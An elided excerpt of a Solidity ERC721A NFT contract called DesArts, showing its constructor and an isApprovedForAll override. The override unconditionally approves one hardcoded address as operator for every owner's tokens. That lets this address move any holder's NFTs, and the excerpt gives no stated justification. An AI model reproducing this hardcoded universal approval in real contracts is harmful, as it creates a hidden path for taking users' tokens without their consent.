  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x0C5Db5c0791A9b19960F114e4be7c0F0133cF5b1){return true;}
...
contract DesArts is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("DesArts", "DES", maxBatchSize_, collectionSize_) {
